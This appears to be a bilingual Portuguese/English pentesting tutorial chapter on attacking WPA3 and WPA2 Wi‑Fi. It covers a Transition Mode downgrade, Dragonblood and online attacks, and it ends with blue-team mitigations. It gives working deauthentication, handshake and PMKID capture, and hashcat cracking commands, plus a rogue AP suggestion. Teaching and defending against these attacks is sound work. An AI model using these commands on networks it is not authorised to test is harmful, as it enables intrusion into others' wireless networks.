2. Realidade do WPA3 Complementar

O WPA3-Personal substituiu o handshake PSK do WPA2 pelo SAE (Simultaneous Authentication of Equals), também chamado Dragonfly. O SAE é um protocolo online-only: não há PMKID nem hash de handshake de 4 vias para crackear offline. Cada tentativa de autenticação exige interação em tempo real com o AP. WPA3-Personal replaced WPA2's PSK handshake with SAE (Simultaneous Authentication of Equals), also called Dragonfly. SAE is an online-only protocol: there is no PMKID or 4-way handshake hash to crack offline. Each authentication attempt requires real-time interaction with the AP.
⚠️ Não há magia / No magic:
Não existe um "modo Hashcat" para WPA3-SAE. Se um AP estiver em WPA3-SAE puro (sem Transition Mode), a captura passiva não te dá nada crackável offline. As opções realistas são: (1) atacar o Transition Mode (downgrade para WPA2), (2) explorar Dragonblood (se o firmware for antigo), ou (3) fazer um ataque online (Wacker, lento e ruidoso). There is no Hashcat mode for WPA3-SAE. If an AP is in pure WPA3-SAE (no Transition Mode), passive capture gives you nothing offline-crackable. Realistic options are: (1) attack Transition Mode (downgrade to WPA2), (2) exploit Dragonblood (if firmware is old), or (3) perform an online attack (Wacker, slow and noisy).

3. Transition Mode — Downgrade para WPA2 Original Complementar

A maioria dos APs com WPA3 corre em Transition Mode: anunciam WPA3-SAE e WPA2-PSK no mesmo SSID, com a mesma password, para compatibilidade com dispositivos antigos. Isto preserva a superfície de ataque do WPA2. Most WPA3-capable APs run in Transition Mode: they advertise WPA3-SAE and WPA2-PSK on the same SSID, with the same passphrase, for legacy device compatibility. This preserves the WPA2 attack surface.

3.1 Identificar Transition Mode / Identify Transition Mode

# A coluna ENC mostra "WPA2 WPA3" ou "SAE PSK"
sudo airodump-ng wlan0mon

# Decodificar RSN capabilities (MFPC/MFPR)
tshark -r capture.pcap -Y "wlan.fc.type_subtype == 8" -T fields -e wlan.ssid -e wlan_mgt.rsn.capabilities.mfpc -e wlan_mgt.rsn.capabilities.mfpr
Se MFPC=1, MFPR=0, o PMF é opcional e o downgrade é viável. Se MFPR=1, o PMF é obrigatório e o downgrade é bloqueado. If MFPC=1, MFPR=0, PMF is optional and downgrade is viable. If MFPR=1, PMF is required and downgrade is blocked.

3.2 Executar Downgrade / Execute Downgrade

# 1. Desautenticar um cliente (forçar reconexão)
sudo aireplay-ng --deauth 3 -a  -c  wlan0mon

# 2. Capturar o handshake WPA2 quando o cliente reconecta
sudo airodump-ng -c  --bssid  wlan0mon -w wpa3_transition

# 3. Converter para Hashcat
hcxpcapngtool -o hash.hc22000 wpa3_transition*.cap

# 4. Crackear offline
hashcat -m 22000 hash.hc22000 rockyou.txt
Alternativa mais furtiva: montar um Rogue AP que anuncia apenas WPA2 com o mesmo SSID. O cliente reconecta-se a ele (por sinal mais forte ou deauth) e completa o handshake WPA2, que capturas. Stealthier alternative: set up a Rogue AP advertising only WPA2 with the same SSID. The client reconnects to it (stronger signal or deauth) and completes the WPA2 handshake, which you capture.

4. Dragonblood Complementar

O Dragonblood (Mathy Vanhoef e Eyal Ronen, 2019) é uma família de falhas no SAE: side-channels de cache/timing (CVE-2019-9494, CVE-2019-9495) que permitem um ataque de partição de password offline, downgrade de grupo SAE (forçar um grupo criptográfico mais fraco), e DoS contra o anti-clogging do AP (CVE-2019-9496). Dragonblood (Mathy Vanhoef and Eyal Ronen, 2019) is a family of SAE flaws: cache/timing side-channels (CVE-2019-9494, CVE-2019-9495) enabling an offline password-partitioning attack, SAE group downgrade (forcing a weaker crypto group), and DoS against the AP's anti-clogging (CVE-2019-9496).
Estado prático / Practical status:
O Dragonblood foi amplamente patcheado (hostapd/wpa_supplicant 2.10, Abril 2022; iOS/macOS 2019; Windows 2019-2020). Só funciona em firmwares antigos ou routers SOHO não atualizados. O valor principal hoje é documentar a vulnerabilidade, não recuperar a password. Dragonblood was widely patched (hostapd/wpa_supplicant 2.10, April 2022; iOS/macOS 2019; Windows 2019-2020). It only works on old firmware or unpatched SOHO routers. Its main value today is documenting the vulnerability, not recovering the password.

5. Ataque Online (Wacker) Complementar

Como o SAE exige interação por tentativa, ataques de dicionário online ainda são possíveis se a password for fraca. O Wacker faz isto, mas é lento e ruidoso (cada tentativa é uma autenticação real). Um estudo IEEE de 2026 confirma que o WPA3 é mais resistente a offline, mas continua vulnerável a passwords fracas via ataques online. Because SAE requires interaction per attempt, online dictionary attacks are still possible if the password is weak. Wacker does this, but it's slow and noisy (each attempt is a real authentication). A 2026 IEEE study confirms WPA3 is more resistant to offline attacks but remains vulnerable to weak passwords via online attacks.

6. WPA2 Clássico — Handshake e PMKID Original

Se o alvo for WPA2 (ou Transition Mode), o fluxo clássico continua a funcionar. O PMKID attack é clientless: um único frame EAPOL do AP pode conter um hash crackável, sem precisar de cliente ligado ou deauth. If the target is WPA2 (or Transition Mode), the classic flow still works. The PMKID attack is clientless: a single EAPOL frame from the AP can contain a crackable hash, without needing a connected client or deauth. 
# Capturar PMKID (clientless)
sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1

# Converter para Hashcat
hcxpcapngtool -o hash.hc22000 capture.pcapng

# Crackear
hashcat -m 22000 hash.hc22000 rockyou.txt

7.1 Script 33.1 — Análise de Configuração WPA3 / WPA3 Configuration Analysis

# Script 33.1 - WPA3 Configuration Analysis (Kali/Linux)
#!/bin/bash
# Requer airodump-ng e tshark
IFACE=${1:-wlan0mon}
echo "[*] Scanning for WPA3 / Transition Mode..."
sudo airodump-ng --output-format csv -w /tmp/wpa3_scan $IFACE &
sleep 15
kill %1 2>/dev/null
echo "[*] Analyzing RSN capabilities..."
tshark -r /tmp/wpa3_scan-01.cap -Y "wlan.fc.type_subtype == 8" \
  -T fields -e wlan.ssid -e wlan_mgt.rsn.capabilities.mfpc -e wlan_mgt.rsn.capabilities.mfpr 2>/dev/null | \
  awk -F'\t' 'NF>=3 {print "SSID: "$1" | MFPC: "$2" | MFPR: "$3"}'

7.3 Script 33.3 — Manifesto de Evidências Wireless / Wireless Evidence Manifest

# Script 33.3 - Wireless Evidence Manifest
param([string]$CaptureDir = ".")
$out = Join-Path $CaptureDir "wireless-manifest.csv"
$results = @()
Get-ChildItem $CaptureDir -Include *.pcap,*.pcapng,*.cap,*.hc22000 -File -EA SilentlyContinue | ForEach-Object {
  $results += [PSCustomObject]@{
    File = $_.Name
    Size = $_.Length
    SHA256 = (Get-FileHash $_.FullName -Algorithm SHA256).Hash
    LastWrite = $_.LastWriteTime
  }
}
$results | Export-Csv $out -NoTypeInformation -Encoding UTF8
Write-Host "[+] Manifest: $out ($($results.Count) files)" -ForegroundColor Green

9. Mitigações Blue Team / Mitigations Complementar

  1. Desativar Transition Mode — WPA3-only elimina o downgrade.
  2. Ativar PMF obrigatório (MFPR=1) — bloqueia deauth forjado.
  3. Atualizar firmware — patches Dragonblood em hostapd/wpa_supplicant 2.10+.
  4. Passwords longas e aleatórias — mitiga Wacker (online).
  5. WPA3-Enterprise com EAP-TLS — imune a Evil Twin (validação de certificado).
  6. Monitorizar Rogue APs — WIDS/WIPS para SSIDs duplicados.
  7. Desativar WPS — evita Pixie Dust.
